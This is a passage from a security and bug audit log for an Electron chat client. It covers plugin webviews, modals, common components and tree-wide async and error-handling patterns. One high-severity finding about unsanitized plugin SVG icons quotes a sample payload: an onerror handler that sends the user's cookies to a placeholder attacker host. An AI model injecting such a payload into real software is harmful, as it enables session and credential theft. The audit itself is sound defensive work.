### [F8-12] low — src/renderer/src/components/ai/AIChatSidebar.tsx:77-86
**What:** the load effect has dep array `[isOpen]` while calling `api.getChats`,
`api.getAiTools`, `api.getAiModels`, `api.getAiOptions` (none guarded for
unmount / re-entrancy). Tools/models/options are refetched every time the
sidebar is opened, and `getAiOptions().then(setAiOptions)` can stomp a change
the user just made in Settings if it resolves late.
**Fix idea:** load once on mount (or when actually stale); add an `alive` guard;
don't overwrite `aiOptions` from a background fetch after the user edits it.
**Status:** open

### [F8-13] low — src/renderer/src/components/ai/hooks/useAIStream.ts:131-152
**What:** the auto-exec / auto-save logic runs inside `setTimeout(fn, 100)` after
`-end`, matching `AIMessageBubble`'s own `100 ms`-free parse. The tool-call
regex `/<tool_call>([\s\S]*?)<\/tool_call>/` and the JSON-in-fence stripping are
duplicated verbatim between `useAIStream` (:132-137) and `AIMessageBubble`
(:78-85) — two copies that can drift, and the `100 ms` delay is a race (if the
user clicks Approve on the card before the timer fires, the tool runs twice).
**Fix idea:** extract a single `parseToolCall(content)` helper; drive auto-exec
off the parsed result rather than a timer, and guard against double execution
with `executingToolId` / a per-message "handled" flag.
**Status:** open

## Slice F9 — Extensions / plugins UI

Files audited: `components/extensions/{ExtensionManager,ExtensionCard,ExtensionLogViewer}.tsx`,
`components/panels/{PanelWebview,SidebarPluginTabs,SettingsPluginPage}.tsx`,
`components/chat/ExtensionChat/{ExtensionChatView,ExtensionChatInput,ExtensionMessageRenderer}.tsx`,
`hooks/{useExtensionChat,useExtensionLog,useExtensionManager}.ts`. Cross-checked
the `<webview>` guest config against `src/main/index.ts` (`webPreferences`,
`web-contents-created`, `setWindowOpenHandler`). Extension/plugin-supplied
strings (card title/body/text, chat message content, manifest name/description,
permission names, slash-command names) are all rendered as React text nodes —
**no `dangerouslySetInnerHTML` anywhere in this slice, no markdown/HTML sink** —
so plugin content cannot inject markup. The webview attack surface and the
IPC-race / leak classes are where the findings are.

### [F9-01] med — src/renderer/src/components/panels/SidebarPluginTabs.tsx:55-101
**What:** `SidebarPluginMainStage` maps over **every** `sidebar-panel`
contribution and renders a `<PanelWebview>` for each, unconditionally; only the
`visible` prop differs (`display: 'flex' | 'none'` in `PanelWebview`). Nothing is
unmounted when a panel is deselected — `activePanelId` only flips `display`.
**Why it's a bug:** each `<webview>` is a full separate renderer process with its
own preload. Every plugin that declares a sidebar panel spins up a live webview
process at app start and keeps it running for the whole session even if the user
never opens it (and each also runs its 2s-ish panel logic, timers, network). With
several panel-contributing plugins installed this is a large fixed memory/CPU cost
and N persistent `plugin://` sessions. `SettingsPluginPage` has the same shape but
is at least gated by the settings route being open.
**Fix idea:** only mount the `<PanelWebview>` for `activePanelId` (plus maybe a
keep-alive for the most-recently-used), or lazy-mount on first open and unmount
after a grace period. At minimum document the per-plugin process cost.
**Status:** open

### [F9-02] med — src/renderer/src/components/panels/PanelWebview.tsx:59-82
**What:** theme tokens are extracted (`extractThemeTokens()`) and pushed into the
guest via `_init(panelId, tokens)` **only** inside the one-shot `dom-ready`
handler. There is no subscription to app theme changes and `_init` is never
called again for the life of the panel.
**Why it's a bug:** toggle the app between light/dark (or any theme change) while
a plugin panel is open and the panel keeps rendering with the `--wa-*` token
values captured at load time — stale colors, unreadable contrast — until the
panel/webview is reloaded. Panels mounted permanently (see F9-01) never reload,
so they are wrong for the rest of the session.
**Fix idea:** subscribe to the same theme-change signal the app uses (or a
`MutationObserver` on `documentElement` class/attr) and re-push tokens via
`executeJavaScript`/a dedicated `smartchat:theme` channel on change.
**Status:** open

### [F9-03] med — src/renderer/src/hooks/useExtensionChat.ts:14-26
**What:** the mount/`extensionId`-change effect does
`api.extensionChatHistory(extensionId).then(setMessages)` with **no is-mounted
guard, no stale-`extensionId` guard**, and registers the `onExtensionChatPush`
listener alongside it. The initial history `setMessages(msgs)` is a full replace.
**Why it's a bug:** (a) rapid switching between two extension chats (or unmounting
the view) while a history fetch is in flight → the late response overwrites the
now-current chat's messages / setState-after-unmount (same class as F3-01).
(b) A push message that arrives in the window between the listener being
registered and `extensionChatHistory` resolving is appended to `prev`, then the
awaited `setMessages(msgs)` replaces the array and **drops that pushed message**
until another event arrives (same class as F3-04). (c) No de-dupe: a push whose
message is also in the fetched history renders twice.
**Fix idea:** capture `extensionId` + an `alive`/seq flag in the effect; ignore
the history resolution if stale; merge the fetched page with messages already in
state (dedupe by `id`) rather than replacing; buffer pushes received before the
first load resolves.
**Status:** open

### [F9-04] med — src/renderer/src/components/panels/PanelWebview.tsx:104-114 (+ src/main/index.ts:114-118,193-205)
**What:** the `<webview>` is declared with only `src` / `preload` / `partition` —
no `webpreferences`, no `sandbox` attribute. Main sets `sandbox: false` globally
and `webviewTag: true`, and the `web-contents-created` hook for `'webview'` only
installs a `setWindowOpenHandler` — there is **no `will-attach-webview` (to pin
guest `webPreferences`) and no `will-navigate` handler**.
**Why it's a bug:** plugin panel guests run **unsandboxed** with the panel
preload (`window.__smartchat`, IPC bridge) attached, and nothing restricts
in-page navigation. A panel HTML that does `location.href = 'https://evil…'`
(or a `<a target="_self">`, a meta-refresh, a form post) navigates the guest to
arbitrary remote/`file:` content **in the same persistent partition with the
plugin API still exposed** — remote content then has the plugin's IPC surface and
whatever `persist:plugin-<id>` holds. Installed plugins are semi-trusted, but a
compromised plugin CDN / an XSS in a panel page escalates straight to the kernel
API.
**Fix idea:** add `will-navigate` on the guest `webContents` that blocks any
navigation whose URL isn't `plugin://<thisPluginId>/…`; add `will-attach-webview`
to force `sandbox`, `contextIsolation`, `nodeIntegration:false` and reject an
unexpected `preload`. (F12/backend may also want this — recorded here as the
renderer declares the tag.)
**Status:** open

### [F9-05] low — src/renderer/src/hooks/useExtensionChat.ts:28-33 & ExtensionChatView.tsx:27-30
**What:** `send()` and `handleAction()` call `api.extensionChatSend(...)` /
`api.extensionChatSend(id, \`__button:${buttonId}\`)` fire-and-forget — no
`.catch`, no pending/failed state. `handleAction` also bypasses the hook's `send`
and encodes the button press as a magic `__button:<id>` text string.
**Why it's a bug:** (a) if the send IPC rejects (extension unloaded mid-chat,
kernel error) the user gets an unhandled promise rejection and zero feedback —
the message just never appears. (b) a user whose literal message starts with
`__button:` is indistinguishable from a real button press to the extension.
**Fix idea:** `.catch` with an inline "couldn't send" affordance; route button
actions through a structured field, not a text-prefix sentinel; have
`handleAction` go through the hook.
**Status:** open

### [F9-06] low — src/renderer/src/hooks/useExtensionLog.ts:12-30
**What:** the immediate `api.extensionGetLog(extensionId).then(setLog)` has no
is-mounted guard, and the 2s `setInterval` runs an `async` callback with no
in-flight guard and no request ordering.
**Why it's a bug:** (a) select an extension then close the manager within the
first fetch → setState-after-unmount. (b) if `extensionGetLog` ever takes >2s,
calls overlap and an older response can land after a newer one → the log panel
briefly shows stale/rewound output. (c) the entire log string is re-fetched over
IPC, re-set, and the whole `<pre>` re-rendered + re-scrolled every 2s regardless
of whether it changed — wasteful for a large/verbose log.
**Fix idea:** `alive` flag; skip a tick if the previous fetch is still pending;
have the backend push log deltas (or an mtime/length) instead of full-poll.
**Status:** open

### [F9-07] low — src/renderer/src/components/panels/PanelWebview.tsx:104-114
**What:** the component renders the `<webview>` with no `did-fail-load` /
`did-finish-load` listeners and no loading or error state.
**Why it's a bug:** if the `plugin://<id>/<panel>` resource 404s (manifest points
at a missing file, extension half-unloaded, protocol handler error) the user sees
a permanently blank panel area with no message. The `SidebarPluginMainStage`
placeholder only covers the "no `panel` declared" case, not a failed load.
**Fix idea:** add `did-fail-load` → render an inline "This panel failed to load"
state with a retry; show a spinner until `dom-ready`.
**Status:** open

### [F9-08] low — src/renderer/src/components/chat/ExtensionChat/ExtensionChatView.tsx:46-58
**What:** message rows use `key={msg.id}` and the push handler in
`useExtensionChat` is append-only with no de-dupe (see F9-03c).
**Why it's a bug:** if the backend re-emits a message on reconnect / retry (same
`id`), React gets duplicate keys in the list → dev warning and a doubled bubble
that can mis-associate on the next update.
**Fix idea:** de-dupe by `id` on insert in the hook.
**Status:** open

### [F9-09] low — src/renderer/src/components/extensions/ExtensionManager.tsx:26-37
**What:** `handleInstall` passes `paths[0]` from `api.selectFile()` straight to
`install()` with no check that it is a `.scext` file; the picker is opened with no
`filters` argument (generic `selectFile`).
**Why it's a bug:** the user can pick any file; the failure only surfaces
(if at all) from the backend as a `console.error('Failed to install extension')`
with no UI message — the modal just silently does nothing after the spinner.
**Fix idea:** pass an accept filter to the file dialog; validate the extension
client-side; surface `install` errors in the modal (the hook already exposes
`error`, but `install` throws are only `console.error`-d here).
**Status:** open

### [F9-10] low — src/renderer/src/hooks/useExtensionManager.ts:15-31
**What:** `refresh()` (`setLoading`/`setExtensions`/`setError`) has no is-mounted
guard; it runs on mount and after every install/unload/reload/uninstall.
`ExtensionManager` unmounts entirely when closed (`if (!isOpen) return null`).
**Why it's a bug:** close the manager while a `refresh()` (or the `refresh()`
chained after `unload`/`uninstall`) is in flight → setState-after-unmount
warnings. Minor, consistent with the F2-03 / F5-13 class.
**Fix idea:** `alive` flag or `AbortController` in `refresh`.
**Status:** open

### [F9-11] low — src/renderer/src/components/panels/PanelWebview.tsx:12-45,63-64
**What:** `extractThemeTokens()` walks **every** stylesheet and **every** CSS rule
in the document (`document.styleSheets` → `rule.style` → each property) on every
panel `dom-ready`.
**Why it's a bug:** with the app's full CSS loaded this is a large O(rules×props)
scan; it runs once per panel load and once per guest reload/navigation, and with
several panels mounted at once (F9-01) they all run it. Perceptible hitch on panel
open on lower-end machines.
**Fix idea:** compute the `--wa-*` token set once at app level (they're a known,
fixed list) and reuse; or cache the result and invalidate only on theme change
(pairs with F9-02).
**Status:** open

### [F9-12] low — src/renderer/src/components/chat/ExtensionChat/ExtensionChatInput.tsx:32-38
**What:** `handleKeyDown` calls `setShowAutocomplete(false)` on `Escape` but does
not `stopPropagation`/`preventDefault`, and there is no keyboard navigation
(Arrow/Enter) of the slash-command autocomplete — it is mouse-`onClick` only.
**Why it's a bug:** (a) keyboard users cannot pick a slash command from the
autocomplete (must type it in full). (b) `Escape` pressed to dismiss the
autocomplete also bubbles to any ancestor Escape handler (e.g. a close-on-Escape
container), closing more than intended.
**Fix idea:** add Arrow/Enter selection with a highlighted index; when the
autocomplete is open, consume the `Escape` key.
**Status:** open

## Slice F10 — Overlays & modals

Files audited: `components/overlays/{ModalPortal,OverlayShell,FormModal,ConfirmModal,AlertModal}.tsx`,
`components/common/{ConfirmModal,SettingsModal}.tsx`, `preload/overlay-preload.ts`
(+ tests `tests/components/{ModalPortal.test,overlays/ModalPortal.test,overlays/OverlayShell.test}.tsx`).
Cross-checked `services/api.service.ts` (`resolveModal`/`overlay*`) and `modals.css`.
`ProfilePicOverlay` and other `common/**` overlays belong to F11.
F1-03 (overlay-preload wildcard `postMessage` + send/receive cross-wiring) is the
preload-side record; F10-02 is its renderer-side companion.

### [F10-01] med — src/renderer/src/components/overlays/OverlayShell.tsx:191
**What:** the plugin `<webview>` is configured
`webpreferences="allowrunninginsecurecontent=yes, contextIsolation=yes"` with no
explicit `sandbox` / `nodeintegration=no` / `nodeIntegrationInSubFrames=no`, and
loads `plugin://<pluginId>/…` content into a **persistent** partition
(`persist:plugin-<pluginId>`).
**Why it's a bug:** `allowrunninginsecurecontent=yes` lets third-party plugin
panel code pull and execute mixed/insecure (`http:`) sub-resources inside the
overlay — an unnecessary weakening for untrusted plugin UIs. Relying on Electron
defaults for the rest (nodeIntegration off, sandbox) instead of stating them
means a future Electron/tooling default change silently widens plugin privilege.
**Fix idea:** drop `allowrunninginsecurecontent`; set `sandbox=yes`,
`nodeintegration=no`, `nodeIntegrationInSubFrames=no`, `webSecurity` on
explicitly. Add a CSP for the `plugin://` protocol.
**Status:** open

### [F10-02] med — src/renderer/src/components/overlays/OverlayShell.tsx:99-110
**What:** on every inbound `api.onOverlaySend` payload the shell calls
`webview.send('smartchat:receive', payloadData)` **and**
`webview.send('smartchat:send', payloadData)` — the same payload on both channel
names. `preload/overlay-preload.ts:45-53` compounds it: each of the
`smartchat:send` and `smartchat:receive` IPC handlers re-`postMessage`s the
payload under *both* channel names (with target origin `'*'`).
**Why it's a bug:** a guest that listens on `smartchat:send` for its own outbound
traffic also receives host→guest inbound data (and vice versa); every inbound
event is delivered twice. A plugin can't distinguish direction, and idempotency
bugs in plugin handlers get triggered by the duplicate.
**Fix idea:** send host→guest only on `smartchat:receive`; keep `smartchat:send`
guest→host only; remove the cross-posting in the preload.
**Status:** open

### [F10-03] med — src/renderer/src/components/overlays/OverlayShell.tsx:76-79
**What:** the `did-fail-load` handler only `console.error`s.
**Why it's a bug:** if the plugin panel URL 404s, the preload path is wrong, or
the panel throws during load, the user is left staring at an empty overlay shell
(header + close button, blank body) with no error message and no auto-dismiss —
looks like a hung app. No retry affordance.
**Fix idea:** on `did-fail-load` (main frame) render an inline error state in the
body with a retry/close button, or auto-`onClose` after surfacing a toast.
**Status:** open

### [F10-04] med — src/renderer/src/components/overlays/FormModal.tsx:44-51
**What:** required-field validation flags a field only when its value is
`undefined | null | ''`. A required `checkbox` whose value is `false` (unchecked)
is not flagged.
**Why it's a bug:** a plugin form with a required consent checkbox ("I agree to
…") can be submitted unchecked — `handleSubmit` passes and `onSubmit(formValues)`
fires with the box `false`. The plugin author's `required: true` is silently
ignored for the one field type where it matters most.
**Fix idea:** special-case `field.type === 'checkbox'` → require `val === true`;
also treat `radio` with no option selected explicitly.
**Status:** open

### [F10-05] med — src/renderer/src/components/common/ConfirmModal.tsx:26 & src/renderer/src/components/common/SettingsModal.tsx:52
**What:** neither modal has an `Escape` handler, focus trap, focus restore to the
opener, or `role="dialog"` / `aria-modal`. They close on backdrop click or an
explicit button only. (The `overlays/*` modals at least get `Escape` via
`ModalPortal`.)
**Why it's a bug:** these are the app's own confirm dialogs (logout, delete
chat/extension, clear data) and the Settings panel. A keyboard-only user cannot
dismiss them with `Escape`, Tab moves focus into the still-present app behind the
backdrop, and on close focus is not returned to the control that opened the
dialog — it lands on `<body>`.
**Fix idea:** a shared modal primitive (the one F5-14 also asks for): portal +
`Escape` + focus trap + `aria-modal="true"` + focus save/restore. Route the
`overlays/*` set and these two through it.
**Status:** open

### [F10-06] med — src/renderer/src/components/common/SettingsModal.tsx:41-49
**What:** `handleToggle` does `setPrefs(updated)` optimistically, then
`await api.setNotificationPreferences(updated)`; the `catch` only `console.error`s
— it never reverts `prefs`.
**Why it's a bug:** if the IPC save rejects (backend error, disk failure), the
checkbox stays in its new position but the preference was not persisted. The user
believes "Launch on startup" / "Desktop notifications" is set; after restart it
is back to the old value with no warning.
**Fix idea:** snapshot the previous value, revert `setPrefs` on `catch`, and show
an inline "couldn't save" message.
**Status:** open

### [F10-07] low — overlays/* + common/{ConfirmModal,SettingsModal} (modals.css:2)
**What:** no modal locks body scroll or `aria-hidden`/`inert`s the app root while
open. `.modal-overlay` is `position: fixed` but does not stop wheel events
reaching the content behind it.
**Why it's a bug:** with a modal open the chat list / message view behind the
backdrop still scrolls on mouse-wheel and every element behind is still in the Tab
order, so focus and scroll leak to the obscured UI.
**Fix idea:** on mount add `overflow:hidden` to `document.body` (restore on
unmount) and `inert` / `aria-hidden` the `#root` sibling; centralize in the
shared primitive from F10-05.
**Status:** open

### [F10-08] low — src/renderer/src/components/common/SettingsModal.tsx:25-37
**What:** the `getNotificationPreferences` effect (`[isOpen, api]`) has no
mounted/abort guard, and `loading` is only ever set to `false`, never reset to
`true` on a subsequent open.
**Why it's a bug:** (a) closing the modal (or a route unmount) before the IPC
resolves calls `setPrefs`/`setLoading` after unmount → React warning (same class
as F2-03 / F5-13). (b) On the 2nd+ open the `loading` gate is already `false`, so
the modal shows the previous session's `prefs` for a beat before the refetch
lands instead of a spinner.
**Fix idea:** `let alive = true` cleanup guard; `setLoading(true)` at the top of
the `isOpen` branch.
**Status:** open

### [F10-09] low — src/renderer/src/components/common/SettingsModal.tsx:106-115
**What:** if `activeTab` holds a plugin settings-page id and that page later
disappears from `pluginSettingsPages` (plugin disabled/unloaded while the modal is
open), `activePage` is `undefined` and the body renders `null`.
**Why it's a bug:** the Settings modal shows only the header and the "Done" button
with an empty body — no content, no fallback to the "general" tab.
**Fix idea:** in an effect, if `activeTab !== 'general'` and no matching page
exists, `setActiveTab('general')`.
**Status:** open

### [F10-10] low — src/renderer/src/components/overlays/ModalPortal.tsx:48-51
**What:** `handleResolve` calls `api.resolveModal(modalId, data)` fire-and-forget
(no `await`, no `.catch`); the modal is removed from local state first.
**Why it's a bug:** if the IPC rejects it's an unhandled promise rejection, and
the main-side modal promise that a plugin is `await`ing may hang forever while the
renderer has already torn the dialog down — the plugin flow stalls with no error.
**Fix idea:** `.catch(console.error)` at minimum; ideally keep the modal until the
resolve round-trips or surface the failure.
**Status:** open

### [F10-11] low — src/renderer/src/components/overlays/ModalPortal.tsx:128-144 vs :57-78
**What:** the tier1 `.modal-overlay` is rendered *before* the webview
`OverlayShell`s in the portal fragment, so a tier2 webview backdrop stacks on top
of an open tier1 modal — but the `Escape` handler resolves the tier1 modal first
(`modals.length > 0` branch wins).
**Why it's a bug:** when both are open, a click lands on the webview overlay
(front-most in the DOM) while `Escape` closes the tier1 modal behind it —
inconsistent "which dialog is active".
**Fix idea:** enforce one policy: either block new tier1 modals while a webview
overlay is up, or make `Escape` act on whichever overlay is visually top-most.
**Status:** open

### [F10-12] low — src/renderer/src/components/overlays/ModalPortal.tsx:25-29
**What:** `onModalShow` appends each `ModalRequest` with no dedupe on `modalId`.
**Why it's a bug:** a backend re-send of the same request (retry / double-emit)
stacks a duplicate modal in `modals`. It self-heals on resolve (the filter
removes all rows with that id), but the user briefly sees two identical dialogs
and only the top one is interactive.
**Fix idea:** `setModals(prev => prev.some(m => m.modalId === req.modalId) ? prev
: [...prev, req])`.
**Status:** open

### [F10-13] low — src/renderer/src/components/overlays/OverlayShell.tsx:26,175-195
**What:** `width` / `height` come straight from the plugin's `request` (defaults
480×360) and are applied as the webview body dimensions with no validation that
they are sane positive numbers.
**Why it's a bug:** a plugin passing a negative / absurd size produces a broken
or zero-size overlay body. Contained by `maxWidth/maxHeight: 90vw/90vh` on the
container so it can't cover the whole screen — cosmetic / robustness only.
**Fix idea:** clamp to a `[min, maxViewport]` range before applying.
**Status:** open

## Slice F11 — Common components & utils

Files audited: `components/common/{ContextMenu,EmojiText,Versions,DefaultAvatars,ProfilePicture,PluginIcon,ProfilePicOverlay}.tsx`,
`utils/{formatters,jidUtils,emojiUtils,emojiData,emojiKeywords,presenceUtils}.ts`.
(`common/{ConfirmModal,SettingsModal}` → F10; `common/{WaveformPlayer,MessageStatusTick}` → F5;
`window.electron` exposure behind `Versions.tsx` already recorded as F1-01.)

### [F11-01] high — src/renderer/src/components/common/PluginIcon.tsx:27-46
**What:** when a contribution/plugin supplies an `icon` string starting with
`<svg`, `PluginIcon` injects it via `dangerouslySetInnerHTML` after a regex that
only strips `width`/`height` and adds a `style` attr — **no sanitization** of
script/event-handler content.
**Why it's a bug:** plugin manifest values reach this component (menu items,
sidebar indicators, panel icons). A manifest icon like
`<svg><image href="x" onerror="fetch('//evil/'+document.cookie)"></svg>` or an
`onload`/`onbegin` handler on a nested SVG element executes script in the
renderer origin the moment the icon mounts (event-handler attributes fire on
`innerHTML`-inserted SVG even though a bare `<script>` would not). Any installed
plugin — or a malicious/typo-squatted one — gets renderer-origin code exec,
which via the F1-01 `window.electron` surface is effectively full IPC access.
**Fix idea:** sanitize with DOMPurify (`USE_PROFILES: { svg: true, svgFilters: true }`)
before injecting, or render plugin SVGs in a sandboxed `<img src="data:image/svg+xml,…">`
(which does not execute script), or only accept a fixed Lucide-name / URL icon
and drop the raw-SVG path.
**Status:** open

### [F11-02] med — src/renderer/src/components/common/ProfilePicture.tsx:35-47
**What:** the preview-fetch effect (`api.getProfilePicture(jid,'preview')` →
`setUrl`) has no check that `jid` is still current when the IPC resolves and no
AbortController; `handleImageError` likewise `await`s then `setUrl` with no
guard. The component is a long-lived single instance in the chat header /
message rows (reused across chat switches, not keyed by jid there).
**Why it's a bug:** open contact A (no cached url) then switch to contact B
before A's `getProfilePicture` resolves → A's preview URL resolves last and
`setUrl` paints A's photo as B's avatar in B's header, until something else
refreshes it. Same class as the F3 out-of-order bugs. Also setState-after-unmount
warnings on fast switching.
**Fix idea:** capture `jid` at call time and bail in the `.then` if
`jid !== <current jid ref>`; or add an `alive` flag cleared in cleanup.
**Status:** open

### [F11-03] med — src/renderer/src/utils/jidUtils.ts:6-11
**What:** `isSameJid` compares only the identifier part (`split('@')[0].split(':')[0]`)
and ignores the domain, so `12345@lid` is reported equal to `12345@s.whatsapp.net`.
LID identifiers and phone numbers are **different namespaces** — the same numeric
string in each refers to unrelated users.
**Why it's a bug:** `isSameJid` gates "is this me" / "is this the same
participant" checks across reactions, mentions, quoted-message ownership, presence
(F3-07 fix also routes through here). A collision between someone's `@lid` value
and another contact's phone number → the app can mis-attribute a reaction/quote
to you or to the wrong member, highlight the wrong mention, etc.
**Fix idea:** only treat identifiers as comparable when the domains are the same
kind, or resolve LID↔PN via the mapping the backend already maintains before
comparing; at minimum require `domain1 === domain2` unless one side is explicitly
a known LID alias of the other.
**Status:** open

### [F11-04] low — src/renderer/src/components/common/DefaultAvatars.tsx:15-22
**What:** `getAvatarColor` does `Math.abs(hash) % DEFAULT_AVATAR_COLORS.length`
on a 32-bit-wrapped hash. `Math.abs(-2147483648)` is still `-2147483648`, so a
jid whose hash lands on `INT_MIN` yields a negative index →
`DEFAULT_AVATAR_COLORS[negative]` is `undefined` → `colorScheme.bg` /
`colorScheme.fg` throws in `ProfilePicture` (no error boundary around the header
avatar).
**Why it's a bug:** astronomically rare but a hard crash of the avatar subtree
when it happens, with no recovery.
**Fix idea:** `((hash % n) + n) % n`, or `(hash >>> 0) % n`.
**Status:** open

### [F11-05] low — src/renderer/src/components/common/ProfilePicOverlay.tsx:35-71
**What:** (a) the "click outside to close" catcher is
`<div className="absolute inset-0 -z-10" onClick={onClose} />` — it sits *behind*
the parent `fixed inset-0 bg-black/80` element, which has no click handler, so
clicking the dimmed backdrop does nothing; only the small X button closes it.
(b) No `Escape` handler, no focus trap, no focus restore, no `role="dialog"`.
(c) `fetchImage` `setImageUrl`/`setLoading` run with no mounted guard.
**Why it's a bug:** the expected "tap anywhere to dismiss" gesture is dead;
keyboard users have only the X button and focus is left behind the overlay.
**Fix idea:** move `onClick={onClose}` onto the visible backdrop element (and
`stopPropagation` on the inner content), add an `Escape` listener + focus
trap/restore (F10 owns the shared modal primitive), guard the fetch.
**Status:** open

### [F11-06] low — src/renderer/src/components/common/ContextMenu.tsx:79-81,169-183,45-67
**What:** (a) list rows use `key={idx}` (fine while items are static, fragile if a
menu ever filters/reorders items — wrong row state/submenu reused). (b) No
`Escape`-to-close (only outside-click and scroll). (c) Submenus open on
`mouseenter` only — no keyboard path and nothing on touch/no-hover; the parent
row's `onClick` just `stopPropagation`s. (d) The reposition effect deps include
`items`; callers passing an inline `items={[…]}` array re-run
`getBoundingClientRect` + `setCoords` every parent render.
**Why it's a bug:** keyboard-only users cannot reach submenu actions or dismiss
the menu with `Escape`; minor churn for inline-array callers.
**Fix idea:** stable keys from `item.label`; add an `Escape` handler to
`onClose`; open submenu on focus/Enter too; memoize or accept that `items` should
be stable.
**Status:** open

### [F11-07] low — src/renderer/src/utils/formatters.ts:1-50
**What:** all `format*` helpers do `Number(ts) * 1000`, assuming a **seconds**
epoch. Several backend fields (edit timestamps, some receipt payloads) are
milliseconds. A ms value renders a date ~year 50000; a seconds value passed where
ms is expected renders 1970. `formatDate` also omits the year, so a message from
a previous year shows an ambiguous "Monday, March 3".
**Why it's a bug:** wrong/absurd timestamps shown when a caller passes the wrong
unit; no year on older separators.
**Fix idea:** normalize the unit centrally (`ts > 1e12 ? ts : ts*1000`), and
append the year in `formatDate` when `date.getFullYear() !== now.getFullYear()`.
**Status:** open

### [F11-08] low — src/renderer/src/components/common/PluginIcon.tsx:49-58
**What:** the image-URL branch renders `<img src={trimmed}>` for any
`http://` / `https://` / `data:image/` plugin icon with no allowlist.
**Why it's a bug:** a plugin icon pointing at a remote `http(s)` URL is a
load-time beacon (the plugin author learns when/where the app renders, plus the
user's IP) and `http://` is mixed content. Minor next to F11-01 but same
untrusted-input source.
**Fix idea:** restrict plugin icons to `data:` URIs (bundled) or a documented
asset scheme; block bare `http:`.
**Status:** open

## Slice F12 — Cross-cutting pass

Tree-wide pass over `src/renderer/src/**` + `src/preload/**` for systemic issues
that span files rather than living in one component: error-boundary coverage,
the unmount-after-async pattern, initial-fetch-vs-live-event ordering, global
subscription ownership, app-wide error surfacing, navigation plumbing, and
polling behaviour. Individual instances are logged under F1–F11; the findings
here record the *pattern* and the app-level gap, and add the genuinely
cross-cutting bugs (F12-01 root boundary, F12-02 navigation event bus).

### [F12-01] crit — src/renderer/src/main.tsx:10-18 (whole renderer tree)
**What:** There is **no error boundary anywhere in the renderer** — a repo-wide
grep for `ErrorBoundary` / `componentDidCatch` / `getDerivedStateFromError`
returns nothing. `main.tsx` renders `<App/>` bare inside `APIProvider` /
`ContributionProvider`.
**Why it's a bug:** any render-time throw anywhere in the tree unmounts the
entire app and leaves a permanent blank white window — the only recovery is
killing and relaunching. Concrete triggers already found in this audit:
`sortChats`/`useChatHierarchy` `BigInt("…")` on a malformed timestamp (F3-10),
`DEFAULT_AVATAR_COLORS[negative]` (F11-04), any throw in a message renderer
(F5-06), a KaTeX/markdown edge case in an AI bubble (F8-07), `PluginIcon`
regex/DOM work on a hostile manifest. Several of these recur on every reload if
the bad data is persisted, so the app is bricked until the row/session is
manually purged. F5-06 / F8-07 noted the missing local boundary; F12 records
that there is also no top-level safety net.
**Fix idea:** add a root `<ErrorBoundary>` in `main.tsx` with a full-screen
"Something went wrong — Reload" fallback (calls `window.location.reload()`), plus
nested boundaries around (a) each `MessageView` row / the message list, (b) each
AI bubble / the AI list, (c) `SidebarPluginMainStage` / panel webviews, so one
bad item degrades to a placeholder instead of taking the pane.
**Status:** open

### [F12-02] high — src/renderer/src/hooks/useChatNavigation.ts:10-29 & src/renderer/src/components/chat/ChatLayout.tsx:157-178
**What:** cross-component navigation ("go to chat" / "go to message" from AI
citations, `useCitationActions`, search, etc.) is implemented by
`window.dispatchEvent(new CustomEvent('smartchat:open-chat', …))`. The **only**
listener is a `useEffect` inside `ChatLayout`.
**Why it's a bug:** the event is fire-and-forget with no buffering, and the
listener is not always there to catch it:
(a) `ChatLayout` is only mounted when `appState === 'ready'` (`App.tsx:132`) — a
navigation dispatched during QR/sync/`connected` (e.g. a notification click, or a
citation action in an AI chat opened before sync finished) is silently dropped.
(b) The listener effect's dep array is `[handleSelectChat, activeJid,
jumpToMessage]`; `activeJid` changes on **every chat switch**, so the listener is
removed and re-added constantly — an event dispatched in that teardown/re-add gap
is lost.
(c) No dedupe: two dispatches for the same target (double-click a citation) run
the open + jump logic twice.
This is the same effect flagged for lying deps in F4-04; F12 records the
architectural problem — using an unbuffered global DOM event as the app's
navigation bus.
**Fix idea:** route navigation through a context/provider method (or a tiny
event bus that retains the last unhandled intent and replays it when a listener
mounts). Keep the listener effect stable (read `activeJid` from a ref).
**Status:** open

### [F12-03] med — tree-wide: "await IPC → setState" with no is-mounted / still-current guard is the dominant data-loading pattern
**What:** the same unguarded shape — `const x = await api.getSomething(id);
setState(x)` with no check that the component is still mounted and `id` is still
the active one, and no `AbortController` — appears in ~15 independent hooks/
components: `App.tsx:27` (F2-03), `ContributionContext` initial fetch,
`useMessages` (F3-01/F3-02), `useChats` (F3-03/F3-04), `MessageItem` (F5-13),
`ChatSearchSidebar` (F7-01/F7-08), `CitationPill`/`useCitation` (F8-04/F8-05),
`useExtensionChat` (F9-03), `useExtensionLog` (F9-06), `useExtensionManager`
(F9-10), `SettingsModal` (F10-08), `ProfilePicture` (F11-02).
**Why it's a bug:** collectively this is the single largest source of
setState-after-unmount warnings and out-of-order-response bugs in the app (wrong
chat's messages / avatar / search results shown after fast switching). Each site
re-implements — or forgets — the guard.
**Fix idea:** add one shared primitive (`useIsMounted()` and/or
`useLiveQuery(fetchFn, deps, { key })` that ignores stale/late resolutions) and
migrate these call sites to it; make it the reviewed default for any new IPC
read.
**Status:** open

### [F12-04] med — tree-wide: initial-fetch replaces state and clobbers live events that arrived during the fetch window
**What:** repeated pattern — an effect both subscribes to an `onX` push event
**and** fires `getX().then(data => setState(data))` where the `.then` does a full
**replace**. A push handled between subscribe and the fetch resolving is
overwritten by the slower fetch. Instances: `ContributionContext:15-38` (F2-02),
`useChats.loadChats` (F3-04), `useExtensionChat` history load (F9-03b),
`AIChatSidebar` options/tools load (F8-12).
**Why it's a bug:** on startup / panel-open the UI briefly shows a fresh
update (new message, unread bump, contribution, pushed extension message) and
then reverts to the pre-event snapshot until the next event — or drops the
event entirely if none follows.
**Fix idea:** standard ordering — subscribe first, buffer events until the
initial load resolves, then merge by id (never blind-replace); or treat the
fetch as lowest priority and skip it if any event already applied.
**Status:** open

### [F12-05] med — subscription/timer-owning hooks are instantiated per-consumer instead of lifted, so IPC listeners and intervals are duplicated
**What:** hooks that each open their own `window.api.on*` subscription and/or
`setInterval` are called from multiple simultaneously-mounted components:
`usePresence()` in both `ChatLayout` and `ChatList` (F3-11) — two
`onPresenceUpdate` listeners + two 2s intervals + two divergent `presences`
maps; `useExtensionManager()` in `ChatLayout` and `ExtensionManager` (and the
list is re-fetched by each); `useContributions`/snapshot consumers are fine
(context) but the pattern isn't applied consistently.
**Why it's a bug:** constant duplicated IPC traffic and timers for the life of
the app, and the independent state copies can visibly disagree during an
expiry/refresh tick.
**Fix idea:** lift the genuinely global ones (presence, extension-manager list)
into context providers with a single subscription/interval; keep per-view hooks
only for view-local state.
**Status:** open

